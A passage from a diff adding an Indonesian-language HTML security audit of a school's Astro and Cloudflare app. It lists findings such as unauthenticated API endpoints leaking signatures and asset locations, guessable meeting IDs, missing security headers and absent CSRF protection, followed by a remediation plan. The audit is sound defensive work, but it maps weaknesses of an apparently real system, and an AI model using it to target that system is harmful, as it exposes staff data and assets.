+    <span class="badge b-high">Tinggi</span>
+  </div>
+  <table>
+    <tr><th>Endpoint</th><th>Data yang terekspos</th></tr>
+    <tr><td><code>GET /api/meetings</code></td><td>Nama lengkap, email, divisi, dan tanda tangan base64 <strong>seluruh</strong> peserta rapat, termasuk tamu eksternal</td></tr>
+    <tr><td><code>GET /api/handovers</code></td><td>Email penerima, nomor seri perangkat, spesifikasi, kondisi barang</td></tr>
+    <tr><td><code>GET /api/assets</code></td><td>Nilai aset (Rp 12,5 jt – 48,5 jt), nomor seri, <strong>lokasi fisik</strong> ("Server Room Lt. 2")</td></tr>
+    <tr><td><code>GET /api/leaves</code></td><td>Nama, jabatan, alasan cuti, sisa hak cuti</td></tr>
+  </table>
+  <p>Khususnya data aset: nilai beli + nomor seri + lokasi ruang server adalah kombinasi yang sangat menarik untuk pencurian fisik maupun penipuan pengadaan. Alasan cuti juga tergolong data pribadi sensitif.</p>
+  <p><strong>Tindakan:</strong> terapkan autentikasi (C-03), lalu minimalkan respons — jangan kirim tanda tangan atau email ke klien kecuali memang ditampilkan, dan sembunyikan nilai aset untuk peran non-manajerial.</p>
+</div>
+
+<!-- ============ SEDANG ============ -->
+<h2 id="sedang">3. Temuan Tingkat Sedang</h2>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tidak ada audit trail yang tahan-ubah (immutable)</p>
+      <div class="fid">M-01 · ISO 21001:2018 — Rekaman &amp; Ketertelusuran</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <p>Setiap <code>PUT</code> menghapus lalu menyisipkan ulang seluruh baris approval (<code>delete</code> + <code>insert</code>). Tidak ada kolom <code>approved_by</code>, <code>approved_at</code>, atau tabel log perubahan. Akibatnya tidak mungkin membuktikan <em>siapa</em> menyetujui <em>apa</em> dan <em>kapan</em>.</p>
+  <p><strong>Tindakan:</strong> tambahkan tabel <code>audit_log</code> (actor_id, action, entity, entity_id, before, after, ip, user_agent, created_at) yang bersifat append-only, dan ubah pembaruan menjadi operasi <code>UPDATE</code> alih-alih hapus-tulis-ulang.</p>
+</div>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">ID rapat mudah ditebak (ruang kunci hanya 10.000)</p>
+      <div class="fid">M-02 · CWE-340 Insecure Identifier</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <pre><code>id: <span class="str">`MTG-</span><span class="com">${Math.floor(Math.random() * 10000)}</span><span class="str">`</span></code></pre>
+  <p>ID ini dipakai sebagai pengenal publik pada tautan absensi (<code>/meeting/MTG-1234</code>) dan kode QR. Dengan hanya 10.000 kemungkinan, seluruh rapat dapat dienumerasi; selain itu <code>Math.random()</code> dapat diprediksi dan berpotensi tabrakan.</p>
+  <p><strong>Tindakan:</strong> gunakan <code>crypto.randomUUID()</code>, atau tambahkan token acak terpisah untuk tamu eksternal. Batasi laju permintaan (rate limit) pada endpoint absensi.</p>
+</div>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tidak ada header keamanan dan Content-Security-Policy</p>
+      <div class="fid">M-03 · Hardening</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <p><span class="file">src/layouts/Layout.astro</span> hanya memuat meta dasar. Tidak ada CSP, <code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>, <code>Referrer-Policy</code>, maupun HSTS — sehingga tidak ada lapisan pertahanan kedua bila terjadi XSS atau clickjacking.</p>
+  <p><strong>Tindakan:</strong> tambahkan header melalui <code>_headers</code> (Cloudflare Pages) atau middleware:</p>
+  <pre><code><span class="com"># public/_headers</span>
+<span class="com">/*</span>
+  X-Frame-Options: DENY
+  X-Content-Type-Options: nosniff
+  Referrer-Policy: strict-origin-when-cross-origin
+  Permissions-Policy: camera=(), microphone=(), geolocation=()
+  Strict-Transport-Security: max-age=31536000; includeSubDomains
+  Content-Security-Policy: default-src 'self'; img-src 'self' data: blob:;
+                           script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';
+                           font-src 'self' https://fonts.gstatic.com; frame-ancestors 'none'</code></pre>
+</div>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tanda tangan disimpan permanen di localStorage</p>
+      <div class="fid">M-04 · Data at Rest (klien)</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <p><span class="file">App.tsx</span> dan <span class="file">/meeting/[id].astro</span> menyimpan gambar tanda tangan ke <code>localStorage</code> tanpa masa kedaluwarsa. Pada komputer laboratorium atau perangkat bersama, tanda tangan pengguna berikutnya masih tersimpan. Cookie sesi 7 hari juga tidak dapat dicabut dari server.</p>
+  <p><strong>Tindakan:</strong> jangan simpan tanda tangan di localStorage; ambil dari server setelah verifikasi sesi. Bila benar-benar perlu cache, gunakan <code>sessionStorage</code> dan bersihkan saat logout.</p>
+</div>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tidak ada validasi dan batasan input di server</p>
+      <div class="fid">M-05 · CWE-20 Improper Input Validation</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <p>Semua handler langsung memakai <code>await request.json()</code> tanpa pemeriksaan tipe, panjang, atau rentang — tidak ada Zod/Valibot. Contoh: <code>body.items</code> dapat berisi ribuan entri, <code>body.price</code> dapat negatif, dan <code>body.title</code> dapat berukuran megabita. Catatan: kueri already terparameterisasi melalui Drizzle, sehingga risiko SQL injection rendah.</p>
+  <p><strong>Tindakan:</strong> definisikan skema Zod per endpoint dan tolak badan permintaan yang tidak sesuai sebelum menyentuh basis data.</p>
+</div>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tidak ada pembatasan laju (rate limiting) atau perlindungan CSRF</p>
+      <div class="fid">M-06 · Availability &amp; CSRF</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <p>Setiap endpoint dapat dipanggil berulang tanpa batas: absensi rapat dapat dipenuhi entri palsu, dan basis data D1 dapat dikuras kuotanya. Endpoint <code>POST</code> juga tidak memiliki token CSRF (hanya terlindungi sebagian oleh <code>SameSite=lax</code>).</p>
+  <p><strong>Tindakan:</strong> gunakan Cloudflare WAF rate-limiting rules pada <code>/api/*</code>; tambahkan token CSRF (double-submit) untuk permintaan yang mengubah data, atau naikkan ke <code>SameSite=strict</code>.</p>
+</div>
+
+<div class="finding med">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Semua pengguna login otomatis mendapat peran <code>staff</code>, tanpa sinkronisasi peran dari basis data</p>
+      <div class="fid">M-07 · Authorization Design</div>
+    </div>
+    <span class="badge b-med">Sedang</span>
+  </div>
+  <p>Callback Microsoft menyetel <code>role: 'staff'</code> secara hardcoded dan tidak pernah mencocokkan <code>graphUser.id</code> dengan kolom <code>users.msId</code>. Akibatnya <em>tidak ada seorang pun</em> yang bisa menjadi approver lewat jalur login yang sah — padahal tabel <code>users</code> sudah berisi peran <code>admin</code>, <code>coordinator</code>, dan <code>approver</code>. Ini kemungkinan besar penyebab mengapa proteksi berbasis peran belum diterapkan.</p>
+  <p><strong>Tindakan:</strong> lakukan upsert pengguna berdasarkan <code>msId</code> saat callback, ambil <code>role</code>, <code>department</code>, dan <code>jobTitle</code> dari tabel <code>users</code> (Entra sebagai sumber identitas, basis data sebagai sumber otorisasi), dan tolak pengguna yang belum terdaftar.</p>
+</div>
+
+<!-- ============ RENDAH ============ -->
+<h2 id="rendah">4. Temuan Tingkat Rendah</h2>
+
+<div class="finding low">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tidak ada berkas <code>.gitignore</code></p>
+      <div class="fid">L-01 · Hygiene</div>
+    </div>
+    <span class="badge b-low">Rendah</span>
+  </div>
+  <p>Tanpa <code>.gitignore</code>, perintah <code>git add .</code> akan menyertakan <code>.env</code>, <code>node_modules/</code> (28.138 berkas), <code>dist/</code>, dan <code>.wrangler/</code>. Ini adalah jalur paling umum terjadinya kebocoran kredensial.</p>
+</div>
+
+<div class="finding low">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Server pengembangan terbuka ke seluruh jaringan (0.0.0.0)</p>
+      <div class="fid">L-02 · Exposure</div>
+    </div>
+    <span class="badge b-low">Rendah</span>
+  </div>
+  <p>Skrip <code>dev</code> dan <code>preview</code> menggunakan <code>--host 0.0.0.0</code> (juga disetel di <code>astro.config.mjs</code>). Di jaringan sekolah atau Wi-Fi publik, siapa pun di subnet yang sama dapat mengakses instance lokal yang tidak terlindungi. Pertimbangkan mengubahnya ke <code>127.0.0.1</code> secara bawaan.</p>
+</div>
+
+<div class="finding low">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Tidak ada pembatasan domain email saat login Microsoft</p>
+      <div class="fid">L-03 · Access Control</div>
+    </div>
+    <span class="badge b-low">Rendah</span>
+  </div>
+  <p>Setiap akun yang berhasil mengautentikasi di tenant akan diterima. Bila tenant mengizinkan akun tamu/personal, pihak luar dapat masuk. Tambahkan pemeriksaan bahwa email berakhiran <code>@edelweiss.sch.id</code> dan bahwa pengguna ada di tabel <code>users</code>.</p>
+</div>
+
+<div class="finding low">
+  <div class="fhead">
+    <div>
+      <p class="ftitle">Data contoh berisi informasi karyawan nyata</p>
+      <div class="fid">L-04 · Data Minimization</div>
+    </div>
+    <span class="badge b-low">Rendah</span>
+  </div>
+  <p><span class="file">src/db/seed.ts</span> dan <span class="file">src/lib/dummyData.ts</span> memuat nama lengkap, email, jabatan, dan ID Microsoft staf sungguhan. Walaupun ikut ter-bundle ke klien, data ini sebaiknya diganti dengan contoh generik atau dipindahkan ke berkas yang hanya boleh diakses server.</p>
+</div>
+
+<!-- ============ DEPENDENSI ============ -->
+<h2 id="dependensi">5. Kerentanan Dependensi</h2>
+<p>Hasil <code>npm audit --omit=dev</code>: <strong>13 kerentanan (7 tinggi, 6 sedang)</strong> pada dependensi produksi.</p>
+<table>
+  <tr><th>Paket</th><th>Masalah</th><th>Tingkat</th></tr>
+  <tr><td><code>@astrojs/cloudflare</code></td><td>SSRF pada endpoint <code>/_image</code> (GHSA-qpr4-c339-7vq8, CVSS 7.2) + kelanjutan perbaikan GHSA-88gm-j2wx-58h6</td><td>Tinggi</td></tr>
+  <tr><td><code>astro</code> 4.16.18</td><td>Terdampak via adapter; perbaikan memerlukan Astro 5</td><td>Tinggi</td></tr>
+  <tr><td><code>undici</code></td><td>Peracunan antrean respons HTTP melalui reuse keep-alive socket</td><td>Tinggi</td></tr>
+  <tr><td><code>ws</code></td><td>Pengungkapan memori belum terinisialisasi; DoS memori dari fragmen kecil</td><td>Tinggi</td></tr>
+  <tr><td><code>miniflare</code></td><td>Mewarisi kerentanan <code>undici</code> dan <code>ws</code></td><td>Tinggi</td></tr>
+  <tr><td><code>@astrojs/node</code></td><td>Beberapa masalah sedang pada penanganan permintaan</td><td>Sedang</td></tr>
+</table>
+<p><strong>Catatan:</strong> sebagian besar (<code>undici</code>, <code>ws</code>, <code>miniflare</code>) hanya muncul melalui tooling Cloudflare dan tidak berjalan di produksi Pages — namun <code>@astrojs/cloudflare</code> memang berjalan di produksi. Perbaikan penuh memerlukan pembaruan ke <code>@astrojs/cloudflare@14.x</code> + Astro 5 (perubahan besar/breaking). Jadwalkan sebagai pekerjaan tersendiri dan uji di lingkungan staging terlebih dahulu.</p>
+
+<!-- ============ RENCANA ============ -->
+<h2 id="rencana">6. Rencana Perbaikan Berprioritas</h2>
+
+<div class="phase">
+  <h3><span class="pnum">0</span> Hari ini — kurang dari 2 jam</h3>
+  <ol>
+    <li><strong>Rotate</strong> client secret Azure dan hapus yang lama. <em>(C-01)</em></li>
+    <li>Buat <code>.gitignore</code>: <code>.env</code>, <code>.env.*</code>, <code>node_modules/</code>, <code>dist/</code>, <code>.wrangler/</code>, <code>.astro/</code>. <em>(C-01, L-01)</em></li>
+    <li>Hapus <code>console.log('DEBUG Secret', …)</code> dan <code>console.error(tokenData)</code>. <em>(H-05)</em></li>
+    <li>Hapus atau nonaktifkan <code>/api/seed</code>. <em>(H-03)</em></li>
+    <li>Simpan secret lewat <code>wrangler pages secret put</code>, hapus berkas <code>.env</code>, lalu <strong>rebuild dan deploy ulang</strong>. <em>(C-01)</em></li>
+    <li>Ganti error handler agar tidak mengembalikan <code>err.message</code> ke klien. <em>(H-05)</em></li>
+  </ol>
+</div>
+
+<div class="phase">
+  <h3><span class="pnum">1</span> Minggu ini — fondasi autentikasi</h3>
+  <ol>
+    <li>Implementasikan sesi bertanda tangan (JWT/<code>jose</code>) dengan cookie <code>httpOnly</code> + <code>secure</code>. <em>(C-02)</em></li>
+    <li>Tambahkan <code>src/middleware.ts</code> untuk melindungi semua <code>/api/*</code>. <em>(C-03)</em></li>
+    <li>Sinkronisasi pengguna: upsert berdasarkan <code>msId</code>, ambil peran dari basis data. <em>(M-07)</em></li>
+    <li>Validasi <code>state</code> OAuth dengan <code>crypto.randomUUID()</code>. <em>(H-04)</em></li>
+    <li>Validasi tanda tangan sebagai <code>data:image/png;base64</code> + escape output + <code>sandbox</code> pada iframe. <em>(H-02)</em></li>
+  </ol>
+</div>
+
+<div class="phase">
+  <h3><span class="pnum">2</span> Minggu depan — integritas dokumen</h3>
+  <ol>
+    <li>Pindahkan logika persetujuan ke server: verifikasi peran dan langkah, ambil tanda tangan dari tabel <code>users</code>. <em>(H-01)</em></li>
+    <li>Tambahkan tabel <code>audit_log</code> bersifat append-only. <em>(M-01)</em></li>
+    <li>Ganti ID rapat ke <code>crypto.randomUUID()</code>. <em>(M-02)</em></li>
+    <li>Terapkan header keamanan dan CSP. <em>(M-03)</em></li>
+    <li>Validasi input dengan Zod di seluruh endpoint. <em>(M-05)</em></li>
+  </ol>
+</div>
+
+<div class="phase">
+  <h3><span class="pnum">3</span> Bulan ini — ketahanan jangka panjang</h3>
+  <ol>
+    <li>Aktifkan WAF Cloudflare dan rate limiting pada <code>/api/*</code>. <em>(M-06)</em></li>
+    <li>Pindahkan berkas tanda tangan dari kolom teks ke Cloudflare R2 (D1 menyimpan base64 besar secara tidak efisien).</li>
+    <li>Terapkan kebijakan retensi dan pencadangan D1 (<code>wrangler d1 export</code> terjadwal).</li>
+    <li>Rencanakan peningkatan ke Astro 5 + <code>@astrojs/cloudflare</code> 14 untuk menutup SSRF. <em>(bagian 5)</em></li>
+    <li>Tambahkan perlindungan CSRF dan pertimbangkan MFA bersyarat di Entra ID.</li>
+  </ol>
+</div>
+
+<!-- ============ POSITIF ============ -->
+<h2 id="positif">7. Hal yang Sudah Baik</h2>
+<div class="ok-box">
+  <ul style="margin:0">
+    <li><strong>Tidak ada SQL injection.</strong> Semua kueri menggunakan query builder Drizzle yang terparameterisasi — tidak ada penggabungan string mentah di SQL.</li>
+    <li><strong>Tidak ada <code>innerHTML</code> atau <code>dangerouslySetInnerHTML</code></strong> di seluruh kode Solid.js, sehingga permukaan XSS di sisi klien relatif kecil.</li>
+    <li><strong>Tidak ada <code>eval()</code> maupun <code>new Function()</code></strong> di mana pun.</li>
+    <li><strong>Autentikasi didelegasikan ke Microsoft Entra ID</strong> — keputusan yang tepat; tidak ada kata sandi yang disimpan atau dikelola sendiri.</li>
+    <li><strong>Operasi hapus sudah menangani dependensi</strong> dengan urutan yang benar (menghapus item dan approval sebelum induknya).</li>
+    <li><strong>Seeding menggunakan <code>onConflictDoNothing()</code></strong>, sehingga <code>/api/seed</code> tidak bersifat destruktif walau terbuka.</li>
+    <li><strong>Struktur basis data sudah masuk akal</strong> — pemisahan tabel approval per jenis dokumen memudahkan penerapan jejak audit nantinya.</li>
+  </ul>
+</div>
+
+<footer>
+  Laporan ini disusun berdasarkan peninjauan kode sumber statis terhadap seluruh proyek <code>D:\astro-app</code> (3 halaman, 18 endpoint API, 17 komponen Solid.js, skema basis data, dan hasil build pada <code>dist/</code>). Tidak ada pengujian yang dijalankan terhadap sistem live. Temuan diurutkan berdasarkan risiko; perkiraan CVSS bersifat indikatif.
+</footer>
+
+</div>
+</body>
+</html>
